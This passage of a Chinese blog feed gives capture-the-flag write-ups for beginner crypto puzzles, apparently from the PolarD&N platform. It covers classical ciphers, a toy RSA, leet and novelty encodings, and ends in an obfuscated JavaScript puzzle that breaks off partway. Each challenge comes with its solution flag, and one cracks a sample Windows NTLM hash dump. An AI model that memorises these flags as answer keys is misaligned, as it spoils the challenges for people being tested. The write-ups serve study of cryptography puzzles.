class="line">flag{c6dac3a0f40dfacefcc473585cdeb0f8}</span><br></pre></td></tr></tbody></table></figure><h1 id="我爱456"><a href="#我爱456" class="headerlink" title="我爱456"></a>我爱456</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">有一个程序员认为456是他的幸运数字，所以干什么都喜欢循环456。得到答案后MD5加密套上flag{}即可</span><br><span class="line">kseYvkasuj5618t</span><br><span class="line">lygemfla235158jd</span><br><span class="line">utasvQsjdybl587t</span><br><span class="line">sydwkuhd54kdhg</span><br><span class="line">jtftY658qiwudhs</span><br><span class="line">iaugwjiushyc871</span><br><span class="line">aksQbhasbkjcbkjd</span><br><span class="line">dvbpzd8v26dfv6f</span><br><span class="line">s6dvdNf6v52v6x</span><br><span class="line">65dT26f5d1b6f5v</span><br><span class="line">35f2Y6d65bbfv5</span><br><span class="line">35dfv32d8bfv256d</span><br><span class="line">kdhMvnhdkjzldkj</span><br><span class="line">sdhjTujsdbch268</span><br><span class="line">sdr26Iksds265dsv</span><br><span class="line">jnm2dsnsdv26865</span><br></pre></td></tr></tbody></table></figure><p>循环456，依次取出4，5，6位</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">""</span></span><br><span class="line">text = [<span class="string">b'kseYvkasuj5618t'</span>,<span class="string">b'lygemfla235158jdb'</span>,<span class="string">b'utasvQsjdybl587t'</span>,<span class="string">b'sydwkuhd54kdhg'</span>,<span class="string">b'jtftY658qiwudhs'</span>,<span class="string">b'iaugwjiushyc871'</span>,<span class="string">b'aksQbhasbkjcbkjd'</span>,<span class="string">b'dvbpzd8v26dfv6f'</span>,<span class="string">b's6dvdNf6v52v6x'</span>,<span class="string">b'65dT26f5d1b6f5v'</span>,<span class="string">b'35f2Y6d65bbfv5'</span>,<span class="string">b'35dfv32d8bfv256d'</span>,<span class="string">b'kdhMvnhdkjzldkj'</span>,<span class="string">b'sdhjTujsdbch268'</span>,<span class="string">b'sdr26Iksds265dsv'</span>,<span class="string">b'jnm2dsnsdv26865'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">    <span class="keyword">if</span> count % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">if</span> count % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i[<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">if</span> count % <span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i[<span class="number">5</span>])</span><br><span class="line">    count = count+<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># YmQwYjQzNTY3MTI2</span></span><br></pre></td></tr></tbody></table></figure><p>base64后得到”bd0b43567126“</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{b5ff0893e6522a037c144a1f502c2b48}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PolarD&amp;N—Crypto简单</title>
      <link href="/2024/01/08/polard-n-crypto-jian-dan/"/>
      <url>/2024/01/08/polard-n-crypto-jian-dan/</url>
      
        <content type="html"><![CDATA[<h1 id="keyboard2-0"><a href="#keyboard2-0" class="headerlink" title="keyboard2.0"></a>keyboard2.0</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">21 31 41</span><br><span class="line">53 63 73</span><br><span class="line">62 72 82</span><br><span class="line">81 91 01</span><br><span class="line">51 61 71</span><br><span class="line">解出来的内容转换为md5值后加上flag{}</span><br></pre></td></tr></tbody></table></figure><p>题目说是键盘密码，个位数只有1 2 3，十位数有2-0</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231219221739185.png" alt="image-20231219221739185"></p><p>手动解密，得到：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">w e rb n mh j ki o pt y u</span><br></pre></td></tr></tbody></table></figure><p>观察发现，中间的字符是enjoy，将”enjoy”转换为MD5(小写32位)</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231219222006203.png"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{76e369257240ded4b1c059cf20e8d9a4}</span><br></pre></td></tr></tbody></table></figure><h1 id="一闪一闪亮星星"><a href="#一闪一闪亮星星" class="headerlink" title="一闪一闪亮星星"></a>一闪一闪亮星星</h1><p><img src="/2024/01/08/polard-n-crypto-jian-dan/%E5%85%B3%E4%BA%8E%E6%88%91%E7%9A%84%E4%B8%80%E4%B8%AA%E7%A7%98%E5%AF%86.jpg"></p><p>提取图片中的文字</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">c = 1433 45 2222 821 1616 41 140 821 1 2475 205 1616 959 140 41 140 959</span><br><span class="line">n = 2537</span><br><span class="line">d = 937</span><br><span class="line">e = 13</span><br></pre></td></tr></tbody></table></figure><p>n,d,e都很小，除去空格，一长串c不大可能，试试把所有的小c求m。尝试后发现得到的数字在0-26之间，尝试字母表</p><p>exp:</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">a = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">c = <span class="string">"1433 45 2222 821 1616 41 140 821 1 2475 205 1616 959 140 41 140 959"</span>.split(<span class="string">" "</span>)</span><br><span class="line">n = <span class="number">2537</span></span><br><span class="line">d = <span class="number">937</span></span><br><span class="line">e = <span class="number">13</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    m = <span class="built_in">pow</span>(<span class="built_in">int</span>(i),d,n)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    <span class="built_in">str</span> += a[m]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="number">25</span> <span class="number">22</span> <span class="number">18</span> <span class="number">11</span> <span class="number">14</span> <span class="number">21</span> <span class="number">4</span> <span class="number">11</span> <span class="number">1</span> <span class="number">23</span> <span class="number">5</span> <span class="number">14</span> <span class="number">17</span> <span class="number">4</span> <span class="number">21</span> <span class="number">4</span> <span class="number">17</span></span><br><span class="line"><span class="comment">#zwslovelbxforever</span></span><br></pre></td></tr></tbody></table></figure><h1 id="interesting"><a href="#interesting" class="headerlink" title="interesting"></a>interesting</h1><p>附件得到图形密码和txt</p><p>得到的内容是小写字母，并32位小写MD5加密即可得到flag,记得套上flag{}。</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/1.jpg"></p><p>圣堂武士和银河标准对照解密即可，得到明文“mixcipher”32小写MD5加密</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{f3057c629db1c0b681b811c205caa163}</span><br></pre></td></tr></tbody></table></figure><p>以下是圣堂武士和银河标准字母对照表</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/d4f872e4f2c54c8d97d804e902ed78a6.png"></p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/f09c9b7a72b14a2e9e57a4df568943bb.png" alt="img"></p><h1 id="黑客熊熊"><a href="#黑客熊熊" class="headerlink" title="黑客熊熊"></a>黑客熊熊</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">hint：提示与熊有关且有黑客语言（leet）。</span><br><span class="line">flag：熊曰：呋食很蜜冬嘿吃發訴噔哮食嗄嗡物擊達取哮啽常歡怎圖襲魚你擊取達非蜂噤擊喜現嚁人麼洞和會現哞哮哞吖哮食人呦動食雜嗥怎襲你</span><br></pre></td></tr></tbody></table></figure><p>与熊论道在线网站：<a href="http://hi.pcmoe.net/index.html">与熊论道/熊曰加密 - PcMoe!</a></p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231219232321511.png"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">|=|@6{@73|}9563(|}|=|=693337@7|=8@(83@|}|=@[)|}}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-jian-dan/3167109-20231108212402294-1988019295.webp" alt="img"><br>黑客语言翻译器：</p><p><a href="https://www.englishcn.com/tools/Leet.htm">Leet密语翻译器 - L33t Translator (englishcn.com)</a></p><p><a href="http://www.toolsxx.com/code/1337.html">在线工具—www.toolsxx.com-XX在线工具-黑客语言在线转换</a></p><p>第二个翻译器可以直接得到flag</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231226143111914.png" alt="image-20231226143111914"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{a7eb95gecbffg9eee7a7f8ac8eabfadb}</span><br></pre></td></tr></tbody></table></figure><h1 id="20是个好数字"><a href="#20是个好数字" class="headerlink" title="20是个好数字"></a>20是个好数字</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">RXMSgNQMa`URaXi</span><br><span class="line">提示：flag{你得到的里面内容的md5值}</span><br></pre></td></tr></tbody></table></figure><p>显然是和20有关的加密，首选凯撒，偏移量20，随波逐流一把梭</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231219234942773.png" alt="image-20231219234942773"></p><p>flag内部包裹的是beautiful，转32位小写md5，得到</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{e8008e06909d08bccc344f7e56b1461b}</span><br></pre></td></tr></tbody></table></figure><p>###我爱吃培根</p><p>直接培根解密，转32位小写md5</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">ABAABABABBABAABAAABABABBBBBAAA</span><br><span class="line">jljcxy</span><br></pre></td></tr></tbody></table></figure><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{ff39fceb368d1d6d9df3be2a95bfc08f}</span><br></pre></td></tr></tbody></table></figure><h1 id="小心有F射"><a href="#小心有F射" class="headerlink" title="小心有F射"></a>小心有F射</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">e(x)=11x+6(mod26)</span><br><span class="line">密文：kesglyueen</span><br><span class="line">提示：flag转化为md5形式</span><br></pre></td></tr></tbody></table></figure><p>显然是仿射密码，a = 11 b = 6</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231219235559161.png" alt="image-20231219235559161"></p><p>将“youaregood”转为32位小写md5</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{d27ca49cb6f5583ae9f3bb2ec38190de}</span><br></pre></td></tr></tbody></table></figure><p>###显而易见的密码</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SYSctf:1002:06af9108f2e1fecf144e2e8adef09efd:e52498f436131252cf062a8d675db2bd:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:bef14eee40dffbc345eeb3f58e290d56:::</span><br><span class="line"></span><br><span class="line">结果套上flag{}即可</span><br></pre></td></tr></tbody></table></figure><p>对：中间的内容MD5爆破，发现只有”e52498f436131252cf062a8d675db2bd”有内容“sys504”</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{sys504}</span><br></pre></td></tr></tbody></table></figure><h1 id="夏多的梦"><a href="#夏多的梦" class="headerlink" title="夏多的梦"></a>夏多的梦</h1><p>一种新的图形密码，夏梦密码</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/%E5%A4%8F%E5%A4%9A%E7%9A%84%E6%A2%A6.png" alt="夏多的梦"></p><p>编码图如下：</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/aHR0cHM6Ly9hLjMzaXEuY29tL3VwbG9hZC8xNy8wMy8yNi9fdGh1bWJzL2JpZy8xNDkwNTE0NjQyMTk5NS5qcGchMzMuanBn" alt="img"></p><p>看上图的最后一行，这四个图案是不是很像钟表的指针？它们可以插在一段密文的任何地方</p><p>1.向上旋转 2.向右旋转90度 3.2基础上再向下旋转90度 4.3基础上向左旋转90度</p><p>所以得到的结果是：ILOVECTF</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{eaf679af3948040d86a2655dc0947873}</span><br></pre></td></tr></tbody></table></figure><h1 id="playfair"><a href="#playfair" class="headerlink" title="playfair"></a>playfair</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">PALHPDUGDCCQCUIQEUKIUEUNLTUNQMIGMPHIISEUHIQZSRNCYXCUQZTLQMIGKNGUNUDMGNUNKU</span><br><span class="line">key=playfair</span><br></pre></td></tr></tbody></table></figure><p>普莱费尔密码，有在线工具，解密得出：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flagfivecbbsixbninecninefonethreefebcninebtwocsixsixtwofthreesevenfdeoneex</span><br></pre></td></tr></tbody></table></figure><p>发现有1-9的英语，换一下。</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{5cbb6b9c9f13febc9b2c662f37fde1ex}</span><br></pre></td></tr></tbody></table></figure><p>交一下，不对？？</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224124910962.png" alt="image-20231224124910962"></p><p>不知道了，看看博客</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">但这个题很坑的，会发现提交不对，也是试了好久才发现问题所在。。。哎烦！</span><br><span class="line">我们很明显看到括号里面是32位，肯定是个md5，因此最后那个x一定是在0-f范围，而且想象一下明显最后那个不算一个我们所熟知的单词，通过这点也能判断。</span><br><span class="line">所以要猜测最后一位，猜测大概率是字母不是数字，因此从a-f一个一个试就行了，会发现是e的时候对了</span><br></pre></td></tr></tbody></table></figure><p>原来是老硬币！</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{5cbb6b9c9f13febc9b2c662f37fde1ee}</span><br></pre></td></tr></tbody></table></figure><h1 id="What-is-the-keyword？"><a href="#What-is-the-keyword？" class="headerlink" title="What is the keyword？"></a>What is the keyword？</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">13155424435324113455153322</span><br><span class="line"></span><br><span class="line">♫♩♬♫♫♭♫¶♫♫♫¶♫¶♬♬‖♭♫¶¶♫♬♩♫♬∮♬♪§♫♬¶♬♭‖♬♯♩♬‖∮♬♪♯♫♫♫♫♫‖♬§♭♫♬¶♬♯♩♬♪♯♫♬♬♬♯♩♫♩♬♫¶‖♬♭♪♫¶♯§==</span><br></pre></td></tr></tbody></table></figure><p>敲击码解密 <a href="http://www.hiencode.com/tapcode.html">CTF在线工具-在线敲击码|敲击码编码|敲击码算法|tap code (hiencode.com)</a></p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224125718368.png" alt="image-20231224125718368"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">密钥是“XIAOZENG”</span><br></pre></td></tr></tbody></table></figure><p>音符解密 <a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">文本加密为音乐符号,可自设密码|文本在线加密解密工具 (qqxiuzi.cn)</a></p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224125956634.png" alt="image-20231224125956634"></p><p>关键字解密</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224155611040.png" alt="image-20231224155611040"></p><p>得到FLAG{KEYW0RD_C1PHER_1S_FUN}</p><p>按照原来的大小写替换</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{Keyw0rD_C1phEr_1s_fuN}</span><br></pre></td></tr></tbody></table></figure><h1 id="上楼梯"><a href="#上楼梯" class="headerlink" title="上楼梯"></a>上楼梯</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">ej^cv`]^/*(*Y(VUR "PJJIGW</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224160120256.png" alt="image-20231224160120256"></p><p>随波逐流一把梭</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{fdf8436f6eec1337fab3c5c422731728}</span><br></pre></td></tr></tbody></table></figure><h1 id="再这么说话我揍你了"><a href="#再这么说话我揍你了" class="headerlink" title="再这么说话我揍你了"></a>再这么说话我揍你了</h1><details><summary>点击查看</summary><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？</span><br></pre></td></tr></tbody></table></figure></details><p>熟悉的阴阳怪气编码</p><p><a href="https://jiji.pro/yygq.js/">阴阳怪气编码 (jiji.pro)</a></p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224160336108.png" alt="image-20231224160336108"></p><p>得到结果：</p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flag{570f9f6b5343d51ffe25a660076378f2}</span><br></pre></td></tr></tbody></table></figure><h1 id="替换？"><a href="#替换？" class="headerlink" title="替换？"></a>替换？</h1><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">key:bgirxjleyucnszhm</span><br><span class="line">Ciphertext:rolwwzupvajwopfw</span><br></pre></td></tr></tbody></table></figure><p>希尔加密</p><p><img src="/2024/01/08/polard-n-crypto-jian-dan/image-20231224160856393.png" alt="image-20231224160856393"></p><figure class="highlight txt"><table><tbody><tr><td class="code"><pre><span class="line">flagishillcipher</span><br><span class="line">flag{hillcipher}</span><br></pre></td></tr></tbody></table></figure><h1 id="xuja-decode"><a href="#xuja-decode" class="headerlink" title="xuja decode"></a>xuja decode</h1><p>题目</p><details><summary>点击查看代码</summary><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+/*´∇｀*/(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + 